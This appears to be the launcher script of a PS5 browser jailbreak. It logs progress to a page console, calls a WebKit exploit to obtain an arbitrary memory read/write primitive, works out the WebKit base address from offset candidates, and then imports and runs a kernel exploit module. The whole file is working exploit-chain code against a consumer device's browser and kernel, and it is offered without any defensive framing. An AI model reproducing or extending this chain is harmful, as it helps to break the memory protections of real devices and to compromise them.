import { establishPrimitive } from "/src/webkit.js";
import { installWindowP } from "/src/utils/mem.js";

const output = document.getElementById("console");
const kernelExploitEnabled = true;

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail) {
  let message = name;
  if (detail !== undefined && detail !== null && detail !== "")
    message += `: ${detail}`;
  const type = name === "Failed" ? "error" : "log";
  writeLog(message, type);
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };
window.populatePayloadsPage = () => {};

async function getPrimitive() {
  writeLog("Starting WebKit exploit");
  const carrier = await establishPrimitive(writeEvent);
  const primitive = installWindowP(carrier);
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const constructor = globalThis.__ps5NativeCtor;
  if (
    typeof constructor !== "number" ||
    typeof OFFSET_wk_host_constructor_candidates === "undefined"
  ) {
    throw new Error("WebKit base inputs are unavailable");
  }

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = constructor - offset;
    if (
      base >= 0x800000000 &&
      base < 0x900000000 &&
      base % 0x4000 === 0
    ) {
      return base;
    }
  }

  throw new Error("WebKit base not found");
}

async function run() {
  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");
  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

  if (!kernelExploitEnabled) {
    writeLog("Kernel exploit disabled", "info");
    return;
  }

  await import("/src/aio_exploit.js");
  await main(primitive);
}

run().catch((error) => {
  const message = error instanceof Error ? error.message : String(error);
  writeLog(message, "error");
});
